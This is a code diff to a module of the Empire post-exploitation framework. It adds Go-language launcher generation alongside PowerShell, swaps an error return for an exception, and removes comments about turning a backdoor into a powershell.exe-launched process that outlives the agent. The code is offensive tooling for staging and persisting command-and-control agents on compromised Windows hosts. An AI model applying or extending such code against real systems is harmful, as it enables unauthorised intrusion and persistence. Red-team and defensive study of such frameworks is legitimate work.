@@ -1,4 +1,5 @@
 from empire.server.common.empire import MainMenu
+from empire.server.core.exceptions import ModuleValidationException
 from empire.server.core.module_models import EmpireModule
 from empire.server.utils.module_util import handle_error_message
 
@@ -12,7 +13,6 @@ class Module:
         obfuscate: bool = False,
         obfuscation_command: str = "",
     ):
-        # staging options
         listener_name = params["Listener"]
         user_agent = params["UserAgent"]
         proxy = params["Proxy"]
@@ -24,7 +24,6 @@ class Module:
         launcher_obfuscate_command = params["ObfuscateCommand"]
 
         if language == "powershell":
-            # generate the launcher script
             launcher = main_menu.stagergenv2.generate_launcher(
                 listener_name=listener_name,
                 language=language,
@@ -45,11 +44,18 @@ class Module:
                 listener_name=listener_name,
             )
 
-        if launcher == "":
-            return handle_error_message("[!] Error in launcher command generation.")
+        elif language == "go":
+            launcher = main_menu.stagergenv2.generate_go_exe_oneliner(
+                language=language,
+                obfuscate=obfuscate,
+                obfuscation_command=launcher_obfuscate,
+                encode=True,
+                listener_name=listener_name,
+            )
 
-        # transform the backdoor into something launched by powershell.exe
-        # so it survives the agent exiting
+        if launcher == "":
+            raise ModuleValidationException("[!] Error in launcher command generation.")
+
         if sys_wow64.lower() == "true":
             stager_code = (
                 "$Env:SystemRoot\\SysWow64\\WindowsPowershell\\v1.0\\" + launcher
